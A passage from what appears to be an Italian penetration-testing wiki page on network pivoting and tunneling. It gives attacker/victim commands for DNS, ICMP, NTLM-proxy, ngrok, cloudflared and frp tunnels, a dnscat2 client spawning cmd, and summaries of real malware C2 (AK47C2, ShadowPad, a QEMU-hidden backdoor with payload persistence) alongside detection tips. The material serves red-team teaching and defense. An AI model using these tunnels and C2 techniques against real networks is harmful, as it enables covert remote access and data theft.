Lo strumento menzionato in precedenza, **Rpivot**, può inoltrare il traffico attraverso un proxy che usa l'autenticazione NTLM. Anche **OpenVPN** può instradare il traffico attraverso un proxy di questo tipo, se configurato con un file di autenticazione e il metodo NTLMv2; si tratta di attraversamento del proxy, non di un bypass dell'autenticazione del proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm esegue l’autenticazione presso i proxy NTLM upstream, espone listener locali e può mappare una porta di tunnel locale a un servizio di destinazione; i client possono quindi usare quella porta locale.<sup>[[29]](#references)</sup>\
Per esempio, inoltra la porta 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Ora, se per esempio configuri il servizio **SSH** sulla vittima in modo che resti in ascolto sulla porta 443, puoi connetterti tramite la porta 2222 dell'attaccante.<sup>[[29]](#references)</sup>\
Puoi anche usare un **meterpreter** che si connette a localhost:443 mentre l'attaccante resta in ascolto sulla porta 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) è il toolkit di Microsoft .NET per reverse proxy. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine crea un tunnel IPv4 tramite query DNS e usa interfacce TUN; la configurazione documentata richiede, su entrambe le estremità, i privilegi necessari per creare tali interfacce.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Il trasporto DNS comporta un overhead maggiore rispetto al TCP diretto ed è in genere lento; puoi creare una connessione SSH compressa attraverso questo tunnel usando:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Scaricalo da qui**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 stabilisce un canale di command-and-control crittografato tramite DNS; i comandi del server e del client riportati di seguito seguono l’utilizzo documentato.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

Puoi usare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un client dnscat2 in PowerShell; il suo README documenta i parametri di `Start-Dnscat2` mostrati di seguito.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding con dnscat**

Il comando interattivo `listen` di Dnscat2 associa un listener locale a un host e una porta remoti.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Modifica il DNS di proxychains

Proxychains-ng intercetta le connessioni TCP collegate dinamicamente e non può trasportare UDP o ICMP; il proxying DNS è configurabile, quindi controlla il `proxychains.conf` installato e l’helper del resolver invece di presumere che venga usato un resolver pubblico fisso. Gli script legacy `proxyresolv` espongono `PROXY_DNS_SERVER` per scegliere il resolver; quando servono nomi interni, usa un resolver raggiungibile dal pivot.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 personalizzato tramite DNS TXT / HTTP JSON (AK47C2)

L’attore Storm-2603 ha creato un **C2 a doppio canale ("AK47C2")** che sfrutta *solo* il traffico **DNS** in uscita e **HTTP POST** in chiaro: due protocolli raramente bloccati nelle reti aziendali.<sup>[[2]](#references)</sup>

1. **Modalità DNS (AK47DNS)**
   • Genera un SessionID casuale di 5 caratteri (ad es. `H4T14`).  
   • Aggiunge `1` all’inizio per le *richieste di task* o `2` per i *risultati* e concatena campi diversi (flag, SessionID, nome del computer).  
   • Ogni campo viene **crittografato con XOR usando la chiave ASCII `VHBD@H`**, codificato in esadecimale e unito con punti; infine viene aggiunto il dominio controllato dall’attaccante:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Le richieste usano `DnsQuery()` per i record **TXT** (e, come fallback, **MG**).  
   • Quando la risposta supera 0xFF byte, la backdoor **suddivide** i dati in blocchi da 63 byte e inserisce i marker:
     `s<SessionID>t<TOTAL>p<POS>` così il server C2 può riordinarli.

2. **Modalità HTTP (AK47HTTP)**
   • Crea un involucro JSON:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • L’intero blob viene sottoposto a XOR con `VHBD@H` → convertito in esadecimale → inviato nel body di un **`POST /`** con header `Content-Type: text/plain`.
   • La risposta usa la stessa codifica e il campo `cmd` viene eseguito con `cmd.exe /c <command> 2>&1`.

Note per il Blue Team
• Cerca query **TXT** insolite, la cui prima label è composta da una lunga stringa esadecimale e che terminano sempre con un dominio raro.
• Una chiave XOR costante seguita da ASCII-hex è facile da rilevare con YARA: `6?56484244?484` (hex di `VHBD@H`).
• Per HTTP, segnala i body delle richieste POST `text/plain` composti solo da valori esadecimali e con un numero pari di byte.

{{#note}}
Il canale mantiene ogni label del sottodominio entro il limite DNS di 63 ottetti, ma il solo rispetto del protocollo non lo rende furtivo; i domini rari, le label esadecimali lunghe e il volume delle query restano segnali di rilevamento.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documenta un tunnel IPv4-over-ICMP che usa un dispositivo TUN e richieste echo ICMP; la configurazione richiede privilegi sufficienti per creare l’interfaccia.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Scaricalo da qui**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng trasporta connessioni TCP tramite ICMP e usa le opzioni `-p`, `-l`, `-r` e `-R` mostrate qui sotto per il proxy, il listener locale, l'host di destinazione e la porta di destinazione.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) è un agent che rende accessibili online i servizi di rete locali tramite un tunnel sicuro; la documentazione della sua CLI descrive endpoint HTTP, TCP e file URL, e il nome host dell'endpoint visualizzato può variare in base all'endpoint e all'account.<sup>[[39]](#references)</sup>

### Installazione

- Crea un account: https://ngrok.com/signup
- Download del client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Utilizzi di base

**Documentazione:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_L'agent supporta anche opzioni di autenticazione e TLS, se necessario.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Esposizione di file tramite HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing delle chiamate HTTP

_Useful per XSS,SSRF,SSTI ..._\
L'agent standalone espone la propria interfaccia di ispezione HTTP su `http://127.0.0.1:4040` per impostazione predefinita; l'interfaccia è dedicata al traffico HTTP.<sup>[[40]](#references)</sup>

#### Tunneling di un servizio HTTP interno

L'opzione `--host-header=rewrite` riscrive l'header HTTP `Host` upstream in modo che corrisponda al servizio locale.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Esempio di configurazione semplice di ngrok.yaml

Usa ngrok Agent Config v2; i tunnel con nome usano `proto` e `addr` e vengono avviati con `ngrok start`.<sup>[[42]](#references)</sup> Apre 3 tunnel:

- 2 TCP
- 1 HTTP che serve file statici da /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels può pubblicare un servizio locale basato su TCP tramite l’infrastruttura di relay Microsoft. La CLI host crea un tunnel in uscita, mentre `devtunnel connect` ricrea la porta ospitata sul client; per impostazione predefinita, i tunnel richiedono l’autenticazione, a meno che i controlli di accesso non vengano deliberatamente allentati.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Questo può esporre RDP tramite `*.devtunnels.ms` senza aprire un nuovo listener in ingresso sul perimetro. Può anche essere abbinato a un tunnel su virtual channel RDP, come `rdp2tcp`, trasformando la sessione RDP in un pivot di secondo livello per traffico TCP arbitrario.<sup>[[58]](#references)</sup>

Per individuare questa attività, correla l'esecuzione della CLI Dev Tunnels con il traffico DNS/TLS verso `*.devtunnels.ms` e con eventi imprevisti sui virtual channel RDP. Un tunnel autenticato non è innocuo solo perché usa un relay di proprietà Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Il connettore `cloudflared` di Cloudflare Tunnel stabilisce connessioni in uscita; le applicazioni pubblicate possono instradare HTTP, HTTPS, TCP, SSH e RDP, mentre i quick tunnel sono pensati per lo sviluppo HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### One-liner per quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Origine SOCKS5 (modalità legacy)

Il flag legacy `--socks5` indica a `cloudflared` che l'origine locale usa SOCKS5; non crea un listener SOCKS5 locale. Per un tunnel gestito, `originRequest.proxyType: socks` configura la gestione dell'origine SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Tunnel persistenti con DNS

La configurazione dei tunnel gestiti localmente usa le chiavi `tunnel`, `credentials-file` e `url` in minuscolo, come mostrato di seguito.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Avvia il connettore:

```bash
cloudflared tunnel run mytunnel
```

Il connector stabilisce connessioni in uscita e, per impostazione predefinita, negozia QUIC con fallback a HTTP/2; non dare per scontato che ogni deployment usi TCP/443. Eseguilo solo con i privilegi richiesti dal tuo deployment.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) è un reverse proxy scritto in Go che supporta **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX e XTCP**. XTCP usa il P2P hole punching, il cui successo dipende dal NAT. A partire dalla **v0.53.0**, può fungere da **SSH Tunnel Gateway**, consentendo a un host di destinazione di usare il client OpenSSH standard senza un binario `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Tunnel TCP inverso classico

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Utilizzo del nuovo gateway SSH (senza binario frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Il comando precedente pubblica la porta **8080** della vittima come **attacker_ip:9000** usando il client OpenSSH standard, mentre `frps` fornisce il gateway.<sup>[[50]](#references)</sup>

## Connessioni UDP di back-connect assistite da STUN

Le richieste STUN Binding inviate da un socket UDP possono rivelarne l'indirizzo IP e la porta server-reflexive, mentre il traffico periodico mantiene attivo il binding NAT. Un server STUN pubblico non è un relay per pacchetti di controllo arbitrari.<sup>[[60]](#references)</sup> Un design di back-connect analizzato manteneva lo stesso socket UDP per un breve datagramma di controllo, quindi usava una *connessione TCP in uscita separata* per recuperare ed eseguire comandi dopo aver ricevuto il trigger.<sup>[[59]](#references)</sup>

Per ricevere il pacchetto UDP del controller, un design deve comunque condividere con il controller il mapping e rispettare i criteri di filtering del NAT. Il filtering dipendente dall'indirizzo o dalla porta può accettare le risposte del server STUN ma scartare i pacchetti provenienti da un altro endpoint.<sup>[[60]](#references)[[61]](#references)</sup> Il percorso di rendezvous del backdoor analizzato non è stato verificato, quindi le sole risposte STUN riuscite non dimostrano che il suo canale di controllo sia raggiungibile.<sup>[[59]](#references)</sup> Per un protocollo separato con rendezvous esplicito e fallback su relay, vedi [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Tunnel covert basati su VM con QEMU

Il networking in modalità utente di QEMU non richiede privilegi root o di amministratore per la rete virtuale e `-netdev user,hostfwd=...` reindirizza le connessioni TCP, UDP o UNIX dall'host al guest.<sup>[[51]](#references)</sup> TrustedSec ha documentato una VM Tiny Core QEMU e un tentativo di tunnel SSH inverso in un incidente in cui un EDR focalizzato sull'host poteva non rilevare l'attività all'interno del guest.<sup>[[1]](#references)</sup>

### Comando rapido su una riga

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Il comando sopra avvia una macchina guest **Tiny Core Linux** con 256 MiB di memoria guest e un’immagine disco qcow2; l’immagine disco non è un disco in RAM.
• La porta **2222/tcp** sull’host Windows viene inoltrata in modo trasparente alla porta **22/tcp** all’interno della macchina guest.  
• Dal punto di vista dell’attaccante, il target espone semplicemente la porta 2222; tutti i pacchetti che la raggiungono vengono gestiti dal server SSH in esecuzione nella VM.

### Avvio in modo stealth tramite VBScript

TrustedSec ha osservato avvii di QEMU pilotati da VBS e immagini Tiny Core nell’incidente citato sopra.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

L'esecuzione dello script con `cscript.exe //B update.vbs` mantiene la finestra nascosta.<sup>[[1]](#references)</sup>

### Persistenza nel guest

L'incidente citato descrive la persistenza nel guest Tiny Core stateless tramite `/opt/bootlocal.sh` e `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Posiziona il payload in `/opt/123.out`  
2. Aggiungi a `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Aggiungi `home/tc` e `opt` a `/opt/filetool.lst` in modo che il payload venga incluso in `mydata.tgz` allo spegnimento.

### Considerazioni sulla telemetria

• L’host continua a esporre il processo QEMU, l’immagine qcow2 e qualsiasi listener inoltrato dall’host.  
• Le scansioni dei processi eseguite solo sull’host potrebbero non esaminare i processi guest, ma la virtualizzazione non garantisce l’evasione: la telemetria di rete, QEMU e delle immagini può comunque esporre l’attività.<sup>[[1]](#references)[[51]](#references)</sup>

### Consigli per i difensori

• Genera un alert per i **binari QEMU/VirtualBox/KVM imprevisti** in percorsi scrivibili dagli utenti.  
• Blocca le connessioni in uscita originate da `qemu-system*.exe`.  
• Cerca porte in ascolto insolite (2222, 10022, …) che si mettono in ascolto subito dopo l’avvio di QEMU.

## Nodi relay IIS/HTTP.sys tramite `HttpAddUrl` (ShadowPad)

Check Point descrive il modulo IIS di ShadowPad come un componente che trasforma i server web perimetrali compromessi in nodi backdoor e relay, associando prefissi URL tramite `HttpAddUrl`.<sup>[[3]](#references)</sup>

Lo stesso report descrive i valori predefiniti, i listener wildcard, la decrittazione dei pacchetti, le code relay e la telemetria di debug riepilogati di seguito.<sup>[[3]](#references)</sup>

* **Valori predefiniti della configurazione** – se il file di configurazione JSON del modulo omette dei valori, vengono usati valori predefiniti IIS plausibili (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). In questo modo, IIS risponde al traffico benigno mostrando il branding corretto.
* **Intercettazione wildcard** – gli operatori forniscono un elenco di prefissi URL separati da punto e virgola (wildcard nell’host e nel percorso). Il modulo chiama `HttpAddUrl` per ciascuna voce, così HTTP.sys instrada le richieste corrispondenti al gestore malevolo; le richieste non corrispondenti seguono il normale comportamento di IIS.
* **Primo pacchetto cifrato** – i primi due byte del corpo della richiesta contengono il seed di un PRNG personalizzato a 32 bit. Ogni byte successivo viene sottoposto a XOR con il keystream generato prima dell’analisi del protocollo:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Orchestrazione del relay** – il modulo mantiene due elenchi: “servers” (nodi upstream) e “clients” (implant downstream). Le voci vengono rimosse se non arriva un heartbeat entro circa 30 secondi. Quando entrambi gli elenchi contengono elementi, abbina il primo server attivo al primo client attivo e inoltra semplicemente i byte tra i rispettivi socket finché una delle due parti non chiude la connessione.
* **Telemetria di debug** – la registrazione facoltativa memorizza l’IP sorgente, l’IP di destinazione e il totale dei byte inoltrati per ogni abbinamento. Gli investigatori hanno usato queste tracce per ricostruire la rete mesh di ShadowPad, estesa su più vittime.

---

## Altri strumenti da verificare

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Nascondersi nell’ombra: tunnel covert tramite virtualizzazione QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Prima di ToolShell: esplorazione delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Dentro Ink Dragon: svelare la rete di relay e il funzionamento interno di un’operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README di Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Guida di riferimento di Nmap: aggirare le restrizioni di firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Manuale di ssh di OpenBSD](https://man.openbsd.org/ssh)
- [7] [Manuale di sshd_config di OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Note di rilascio di OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README di sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Documentazione del modulo socks_proxy di Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Documentazione del modulo autoroute di Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: proxy SOCKS](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: port forwarding inverso](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README di reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README di Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Guida introduttiva a Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listener di Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost di Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README di rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Manuale di socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Manuale di PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opzioni della riga di comando di PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Comando Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README di SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Documentazione di Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Regole di proxificazione di Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Manuale di OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README di YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README di iodine](https://code.kryo.se/iodine/README.html)
- [32] [README di dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README di dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README di proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: nomi di dominio – implementazione e specifica](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README di ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI dell’agent ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interfaccia di ispezione web di ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Host virtuali di ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Configurazione v2 dell’agent ngrok](https://ngrok.com/docs/agent/config/v2)
- [43] [Panoramica di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parametri origin di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Configurazione di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [File di configurazione di Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parametri di esecuzione di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Concetti di frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP di frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Gateway SSH Tunnel di frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Documentazione sul networking di QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README di wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Repository del codice sorgente di NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: una tailnet fronted da CDN da un BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Comandi CLI di Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle: GhostContainer e tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN: backdoor Linux che sfrutta l’infrastruttura STUN pubblica](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Requisiti comportamentali NAT per UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [README di Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Il malware Kothamine usa tailcat di Tailscale per eludere il rilevamento di rete](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
